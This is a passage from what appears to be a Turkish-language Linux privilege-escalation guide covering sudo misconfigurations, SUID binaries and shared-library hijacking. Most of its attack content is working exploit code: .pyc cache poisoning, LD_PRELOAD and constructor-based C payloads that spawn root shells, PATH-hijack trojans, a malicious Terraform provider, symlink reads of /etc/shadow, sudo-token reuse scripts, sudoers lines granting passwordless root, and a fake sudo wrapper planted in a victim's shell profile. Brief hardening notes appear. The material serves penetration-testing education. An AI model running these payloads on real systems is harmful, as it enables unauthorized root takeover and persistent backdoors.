Çağıran, dilimlenecek `.3mf` projesini seçebiliyorsa, `prusaslicer` veya `prusa-slicer` için root yetkisiyle çalışabilen ve kısıtlanmamış bir sudo izni incelenmelidir. Bir proje, G-code dışa aktarılırken çalıştırılan bir post-processing script'i içerebilir; hazırlanmış projeler, 2.6.1 sürümüne kadar PrusaSlicer içinde komut çalıştırabilir ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Yetki sınırının aşılabilir olduğu sonucuna varmadan önce etkin sudo kuralını, binary sürümünü ve satıcı yamalarını, proje kaynağını ve ilgili dışa aktarma yolunun çalışıp çalışmadığını doğrulayın. Sabitlenmiş bir proje argümanı veya etkin bir `NOEXEC` politikası sonucu değiştirebilir. Slicer'ın kurulu olduğunu bulmak tek başına bir yetki yükseltme yolu olduğunu göstermez.

### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Bu örnek, **HTB makinesi Admirer'ı temel alan**, betiği root olarak çalıştırırken rastgele bir Python kütüphanesi yüklemek için **PYTHONPATH hijacking** saldırısına karşı **savunmasızdı**:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo ile çalıştırılmasına izin verilen Python import'larında yazılabilir `__pycache__` / `.pyc` poisoning

**sudo ile çalıştırılmasına izin verilen bir Python script'i**, paketin dizininde **yazılabilir bir `__pycache__`** bulunan bir modülü import ediyorsa, önbelleğe alınmış `.pyc` dosyasını değiştirebilir ve sonraki import sırasında ayrıcalıklı kullanıcı olarak code execution elde edebilirsiniz.<sup>[[30]](#references)</sup>

- Neden işe yarar:
  - CPython, bytecode önbelleklerini `__pycache__/module.cpython-<ver>.pyc` konumunda saklar.<sup>[[31]](#references)</sup>
  - Interpreter, **header**'ı (magic + kaynak dosyaya bağlı zaman damgası/hash metadata'sı) doğrular, ardından bu header'dan sonra saklanan marshaled code object'i çalıştırır.
  - Dizin yazılabilir olduğu için önbelleğe alınmış dosyayı **silebilir ve yeniden oluşturabilirseniz**, root'a ait ancak yazılamayan bir `.pyc` dosyası bile değiştirilebilir.
- Tipik yol:
  - `sudo -l`, root olarak çalıştırabileceğiniz bir Python script'i veya wrapper gösterir.
  - Bu script, `/opt/app/`, `/usr/local/lib/...` vb. konumlardaki yerel bir modülü import eder.
  - Import edilen modülün `__pycache__` dizini sizin kullanıcınız veya herkes tarafından yazılabilir durumdadır.

Hızlı enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ayrıcalıklı script'i inceleyebiliyorsanız, içe aktarılan modülleri ve önbellek yolunu belirleyin:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Kötüye kullanım iş akışı:

1. Python'ın meşru cache dosyasını oluşturması için, henüz yoksa sudo ile çalıştırılmasına izin verilen script'i bir kez çalıştırın.
2. Meşru `.pyc` dosyasının ilk 16 baytını okuyup zehirlenmiş dosyada yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, özgün cache dosyasını silin ve özgün başlıkla kötü amaçlı bytecode'u birleştirerek dosyayı yeniden oluşturun.
4. Payload'un import sırasında root olarak çalışması için sudo ile çalıştırılmasına izin verilen script'i yeniden çalıştırın.

Önemli notlar:

- Özgün başlığı yeniden kullanmak önemlidir; çünkü Python, bytecode gövdesinin kaynak dosyayla gerçekten eşleşip eşleşmediğine değil, cache metadata'sının kaynak dosyayla eşleşip eşleşmediğine bakar.
- Bu yöntem özellikle kaynak dosyası root'a ait ve yazılamaz durumdayken, dosyanın bulunduğu `__pycache__` dizini yazılabilir olduğunda kullanışlıdır.
- `PYTHONDONTWRITEBYTECODE=1` ve `python -B`, Python'ın yeni `.pyc` dosyaları yazmasını engeller; önceden var olan ve saldırgan tarafından değiştirilmiş geçerli bir cache'i yüklemesini **engellemez**. Kritik sınır, daha düşük ayrıcalıklı bir kullanıcının ayrıcalıklı import'un kabul edeceği bir cache'i değiştirip değiştiremeyeceğidir. Python, cache'lenmiş bytecode'u yüklemeden önce zaman damgası/boyut veya hash metadata'sını kontrol eder. [Python import başvurusuna](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) ve [komut satırı belgelerine](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) bakın.

Minimal proof-of-concept yapısı:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Python import path içindeki hiçbir dizinin, `__pycache__` dahil, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmadığından emin olun.
- Mevcut `.pyc` dosyaları dahil, önbellek dizinlerinin sahipliğini ve izinlerini denetleyin. Bytecode yazmayı devre dışı bırakmak yeni önbelleklerin oluşturulmasını azaltabilir, ancak değiştirilebilir mevcut bir önbelleği etkisiz hâle getirmez.
- Yazılabilir yerel Python modüllerini ve yazılabilir önbellek dizinlerini, root tarafından çalıştırılan yazılabilir shell script’leri veya paylaşılan kütüphaneler gibi değerlendirin.

### sudo env_keep ile korunan BASH_ENV → root shell

sudoers `BASH_ENV` değerini koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komut çalıştırılırken root olarak keyfi kod çalıştırmak için Bash’in etkileşimsiz başlangıç davranışından yararlanabilirsiniz.<sup>[[24]](#references)</sup>

- Nasıl çalışır: Etkileşimsiz shell’lerde Bash, hedef script’i çalıştırmadan önce `$BASH_ENV` değerini değerlendirir ve belirtilen dosyayı kaynak olarak yükler. Birçok sudo kuralı, bir script’in veya shell wrapper’ının çalıştırılmasına izin verir. `BASH_ENV` sudo tarafından korunuyorsa dosyanız root ayrıcalıklarıyla kaynak olarak yüklenir.<sup>[[23]](#references)</sup>

- Gereksinimler:
  - Çalıştırabileceğiniz bir sudo kuralı ( `/bin/bash` komutunu etkileşimsiz olarak çağıran herhangi bir hedef veya herhangi bir bash script’i).
  - `BASH_ENV` değerinin `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Güvenliği sıkılaştırma:
  - `BASH_ENV` (ve `ENV`) değişkenini `env_keep` listesinden çıkarın, `env_reset` kullanmayı tercih edin.
  - `sudo` ile izin verilen komutlar için shell wrapper’ları kullanmaktan kaçının; minimal binary’leri kullanın.
  - Korunan env değişkenleri kullanıldığında `sudo` I/O logging ve alerting kullanmayı değerlendirin.

### Korunan HOME ile sudo üzerinden Terraform (!env_reset)

`sudo`, Terraform’ın daha ayrıcalıklı bir kullanıcı olarak çalışmasına izin verdiğinde `!env_reset`, o belirli kural kapsamında hangi environment variable’ların gerçekten korunduğunu kontrol etmek için bir ipucudur. Çağıranın yazabildiği `.terraformrc` veya `terraform.rc` dosyasını etkin CLI yapılandırması olarak kabul etmeden önce, etkin `HOME` veya `TF_CLI_CONFIG_FILE` değerini doğrulayın. `provider_installation.dev_overrides` girdisi yalnızca sabit Terraform komutu o provider’ı yüklerse ve çağıran, yürütülebilir dosyasını seçilen dizine yerleştirebiliyorsa önem taşır.<sup>[[25]](#references)</sup>

- Gerekli provider’ı yazılabilir bir dizine yönlendirin ve provider’ın adını taşıyan kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform Go plugin handshake'ini başarısız kılar ancak ölmeden önce payload'u root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR geçersiz kılmaları + symlink doğrulamasını atlatma

Terraform değişkenleri, ilgili sudo kuralı bu değişkenleri koruyorsa `TF_VAR_<name>` ortam değişkenleri aracılığıyla sağlanabilir. Kaynak symlink'ini **okumak** için ayrıca bağlantıyı izleyen ve korumalı sonucu çağıranın okuyabileceği bir hedefe kopyalayan bir provider gerekir. Hedef symlink'ine **yazmak** ise ayrı olarak, çağıranın kontrol ettiği bir hedef girdisi ve yazma sırasında bağlantıyı izleyen ayrıcalıklı bir provider gerektirir; sonradan çalıştırılan bir iş, bunun olası sonuçlarından yalnızca biridir. Bu yöntemlerden herhangi birini denemeden önce `sudo -l`, `stat` ve `readlink` gibi salt okunur komutlarla tam sudo iznini, ilgili `.tf` dosyalarını, seçili CLI yapılandırmasını ve yolların sahipliğini inceleyin. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf sözdizimsel doğrulamalar symlink'leri çözümlemez:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform symlink'i çözümler ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'lerini önceden oluşturarak ayrıcalıklı konumlara **yazmak** için de kullanılabilir (ör. provider'ın hedef yolunu `/etc/cron.d/` içindeki bir konuma yönlendirmek).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo, yalnızca etkileşimli bir TTY'den çalışmasını zorunlu kılan `requiretty` ile yapılandırılabilir. `!requiretty` ayarlanmışsa (veya seçenek yoksa), sudo reverse shell'ler, cron işleri veya betikler gibi etkileşimsiz bağlamlardan çalıştırılabilir.

```bash
Defaults !requiretty
```

Bu tek başına doğrudan bir güvenlik açığı değildir, ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları artırır.

### Sudo env_keep+=PATH / güvensiz secure_path → PATH hijack

`sudo -l` çıktısında `env_keep+=PATH` veya saldırganın yazabildiği girdiler içeren bir `secure_path` (ör. `/home/<user>/bin`) görülüyorsa, sudo ile çalıştırılmasına izin verilen hedef içindeki tam yolu belirtilmemiş harici bir komut gölgelenebilir.<sup>[[3]](#references)</sup> Etkin bir `secure_path` olmaması da **komutun sudo ortamının çağıranın kontrolündeki bir `PATH` değerini koruması durumunda** incelenmelidir; tek başına bu değerin olmaması, `PATH` değerinin korunduğunu kanıtlamaz. İzin verilen betiği çalıştırmadan okuyun, ardından tam RunAs ve argüman kuralını, etkin komut arama yolunu ve komut adıyla eşleşen, daha önce aranan, yazılabilir ve erişilebilir bir dizini doğrulayın. Kimlik doğrulama, `NOEXEC`, kabuk yerleşik komutları ve mutlak komut yolları sonucu değiştirebilir.

- Gereksinimler: tam yol kullanmadan komut çağıran (`free`, `df`, `ps` vb.) bir betiği/ikili dosyayı çalıştıran bir sudo kuralı (genellikle `NOPASSWD`) ve önce aranan yazılabilir bir `PATH` girdisi.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo yürütmesinde yolları atlama
Başka dosyaları okumak için **atlayın** veya **symlink** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Bir **wildcard** kullanılırsa (\*), daha da kolaydır:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu belirtilmeden sudo komutu/SUID binary

Tek bir komuta **sudo izni** **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_, PATH değişkenini değiştirerek bundan yararlanabilirsiniz.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Bu technique, **suid** binary **bir komutu yolunu belirtmeden çalıştırıyorsa da kullanılabilir (tuhaf bir SUID binary’nin içeriğini her zaman** _**strings**_ **ile kontrol edin)**.

[Çalıştırılacak payload örnekleri.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Komut yolu içeren SUID binary

**suid** binary **başka bir komutu yolunu belirterek çalıştırıyorsa**, dosyanın çağırdığı komutun adını taşıyan bir **function export etmeyi** deneyebilirsiniz.

Örneğin, bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, function’ı oluşturup export etmeyi deneyin:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Sonra, SUID binary'yi çağırdığınızda bu işlev yürütülür

### Özel SUID kopyalama wrapper'ları

Kaynağı ve hedef yolları kabul eden, root sahibi bir SUID yardımcı programı iki farklı güven sınırını aşabilir. Her iki argümandan da bir shell komutu oluşturursa (örneğin, oluşturulan bir `cp` komutunu `system()`'e verirse), shell metakarakterleri komutun etkin ayrıcalıklarıyla başka bir komut çalıştırabilir. `cp`'yi shell kullanmadan güvenli biçimde çağırsa bile, kısıtlanmamış bir hedef `/etc/passwd` gibi dosyalara ayrıcalıklı şekilde yazılmasına olanak tanıyabilir. Wrapper'ın argüman işleme biçimini, etkin UID davranışını, hedef kısıtlamalarını ve kopyalanan dosyanın içeriğinin çağıran tarafından kontrol edilip edilemediğini inceleyin; genel bir `cp` hatası ya da SUID biti tek başına bu yollardan herhangi birinin mümkün olduğunu kanıtlamaz. Herhangi bir manuel testten önce binary'yi ve izinlerini pasif olarak listeleyin.

### SUID wrapper tarafından yürütülen yazılabilir script

Yaygın bir özel uygulama yanlış yapılandırması, root sahibi bir SUID binary wrapper'ın bir script'i çalıştırması ve script'in düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmasıdır.

Tipik örüntü:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` yazılabiliyorsa, payload komutlarını ekleyip ardından SUID wrapper'ı çalıştırabilirsiniz:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Hızlı kontroller:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Bu saldırı yolu, özellikle `/usr/local/bin` içinde bulunan "maintenance"/"backup" wrapper'larında yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, loader tarafından diğer tüm kütüphanelerden (standart C kütüphanesi (`libc.so`) dahil) önce yüklenmesi gereken bir veya daha fazla paylaşımlı kütüphaneyi (.so dosyaları) belirtmek için kullanılır. Bu işlem, bir kütüphaneyi önceden yükleme olarak bilinir.

Ancak sistem güvenliğini korumak ve bu özelliğin istismar edilmesini, özellikle **suid/sgid** yürütülebilir dosyalarla, önlemek için sistem belirli koşulları uygular:

- Gerçek kullanıcı kimliğinin (_ruid_) etkin kullanıcı kimliğiyle (_euid_) eşleşmediği yürütülebilir dosyalarda loader, **LD_PRELOAD**'ı yok sayar.
- suid/sgid bitlerine sahip yürütülebilir dosyalarda yalnızca standart yollarda bulunan ve kendileri de suid/sgid bitlerine sahip olan kütüphaneler önceden yüklenir.

`sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi bulunuyorsa ayrıcalık yükseltme gerçekleşebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin korunmasına ve komutlar `sudo` ile çalıştırıldığında da tanınmasına olanak tanır; bu da yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** olarak kaydedin

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Ardından **şu komutla derleyin**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Son olarak, **escalate privileges** çalıştırarak

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa benzer bir privesc yönteminden yararlanabilir; çünkü kütüphanelerin aranacağı yolu kontrol eder.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Alışılmadık görünen **SUID** izinlerine sahip bir binary ile karşılaştığınızda, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini kontrol etmek iyi bir uygulamadır. Bunu aşağıdaki komutu çalıştırarak kontrol edebilirsiniz:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, exploit için bir fırsat olabileceğini gösterir.

Bunu exploit etmek için _"/path/to/.config/libcalc.c"_ gibi bir C dosyası oluşturup içine aşağıdaki kodu yazabilirsiniz:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Bu kod, derlenip çalıştırıldığında, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını şu komutla bir shared object (.so) dosyasına derleyin:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Son olarak, etkilenen SUID binary'sini çalıştırmak exploit'i tetikleyerek sistemin ele geçirilmesine yol açabilir.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Artık yazma iznimizin olduğu bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, bu klasörde gerekli adla kütüphaneyi oluşturalım:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Şu tür bir hata alırsanız

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), saldırganların yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix ikili dosyalarının derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynıdır, ancak **bir komuta yalnızca argüman ekleyebildiğiniz** durumlar içindir.

Proje; kısıtlı kabuklardan çıkmak, yükseltilmiş ayrıcalıkları yükseltmek veya korumak, dosya aktarmak, bind ve reverse shell başlatmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralının nasıl istismar edilebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

**sudo erişiminiz** olduğu ancak parolayı bilmediğiniz durumlarda, **bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını ele geçirerek** ayrıcalıklarınızı yükseltebilirsiniz.<sup>[[18]](#references)</sup>

Ayrıcalıkları yükseltmek için gerekenler:

- "_sampleuser_" kullanıcısı olarak zaten bir shell'iniz olmalı
- "_sampleuser_" **son 15 dakika içinde** bir şeyi çalıştırmak için **`sudo` kullanmış** olmalı (varsayılan olarak, bu süre sudo token'ının süresidir ve parola girmeden `sudo` kullanmamıza olanak tanır)
- `cat /proc/sys/kernel/yama/ptrace_scope` komutunun çıktısı 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmeniz gerekir)

(`ptrace_scope` değerini geçici olarak `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` komutuyla veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak düzenleyip `kernel.yama.ptrace_scope = 0` değerini ayarlayarak etkinleştirebilirsiniz)

Tüm bu gereksinimler karşılanıyorsa, **aşağıdakini kullanarak ayrıcalıklarınızı yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` ikili dosyasını oluşturur. Bunu **oturumunuzda sudo token'ını etkinleştirmek** için kullanabilirsiniz (otomatik olarak root shell almazsınız; `sudo su` çalıştırın):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **İkinci exploit** (`exploit_v2.sh`), _/tmp_ içinde **root tarafından sahip olunan ve setuid bit’i ayarlanmış** bir sh shell oluşturur.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Üçüncü exploit** (`exploit_v3.sh`), **sudoers dosyası oluşturur**; bu dosya **sudo token'larını kalıcı hale getirir ve tüm kullanıcıların sudo kullanmasına izin verir**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Klasörde veya klasörün içindeki oluşturulmuş dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token** oluşturmak üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary dosyasını kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasının üzerine yazabiliyorsanız ve bu kullanıcı olarak PID'si 1234 olan bir shell'iniz varsa, parolayı bilmenize gerek kalmadan aşağıdaki komutla **sudo ayrıcalıkları elde edebilirsiniz**:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, `sudo`'yu kimlerin ve nasıl kullanabileceğini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Bu dosyayı** **okuyabilirseniz**, **ilginç bilgiler edinebilirsiniz**; herhangi bir dosyaya **yazabilirseniz** ayrıcalıkları **yükseltebilirsiniz**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Yazma izniniz varsa bu izni kötüye kullanabilirsiniz.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Bu izinleri kötüye kullanmanın başka bir yolu:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

`sudo` binary’sine, OpenBSD için `doas` gibi bazı alternatifler vardır. `/etc/doas.conf` yapılandırmasını kontrol etmeyi unutmayın.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas` bir düzenleyiciye veya yorumlayıcıya izin veriyorsa, GTFOBins tarzı kaçış yöntemlerini kontrol edin:

```bash
doas vim
:!/bin/sh
```

A root yetkisine sahip `doas` kuralı, orijinal Python tabanlı `dstat` için eklenti yolu incelemesini de gerektirir. [Kılavuzunda](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) ve [kaynak kodunda](https://github.com/dstat-real/dstat/blob/master/dstat), `dstat_*.py` eklentilerinin bulunduğu konumlar arasında `/usr/share/dstat/` ve `/usr/local/share/dstat/` listelenir. Geçerli kullanıcı, kurulu derlemenin gerçekten kullandığı bir konuma yazma ve arama iznine sahipse seçilen bir eklenti, `doas` RunAs kimliğiyle çalışabilir. Etkin kuralı, o derlemedeki eklenti arama davranışını, dizin ve üst dizin izinlerini veya ACL'leri ve çağıranın eklenti seçip seçemediğini doğrulayın; yalnızca bir `dstat` kuralı veya yazılabilir bir dizin, araştırmaya devam etmek için bir ipucudur. Diğer `dstat` uygulamaları farklı eklenti sistemleri kullanabilir. Eklenti yüklemeden meta verileri pasif olarak inceleyin.

### Sudo Hijacking

Bir **kullanıcının genellikle bir makineye bağlanıp yetkilerini yükseltmek için `sudo` kullandığını biliyorsanız** ve bu kullanıcının bağlamında bir shell elde ettiyseniz, kodunuzu root olarak çalıştırıp ardından kullanıcının komutunu çalıştıracak **yeni bir sudo executable oluşturabilirsiniz**. Ardından kullanıcının bağlamındaki **$PATH'i değiştirin** (örneğin, `.bash_profile` dosyasına yeni yolu ekleyerek); böylece kullanıcı `sudo` çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Kullanıcı farklı bir shell kullanıyorsa (bash değilse), yeni yolu eklemek için başka dosyaları değiştirmeniz gerekeceğini unutmayın. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback), `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şöyle bir şey çalıştırabilirsiniz:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenen yapılandırma dosyalarının nereden geldiğini** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin aranacağı** diğer klasörleri **belirtir**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Herhangi bir nedenle **bir kullanıcının** `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasında belirtilen herhangi bir klasör üzerinde **yazma izinleri varsa**, ayrıcalıklarını yükseltebilir.\
**Bu yanlış yapılandırmanın nasıl istismar edileceğine** aşağıdaki sayfadan göz atın:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib`'i `/var/tmp/flag15/` içine kopyaladığınızda, `RPATH` değişkeninde belirtildiği gibi bu konumdaki program tarafından kullanılacaktır.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
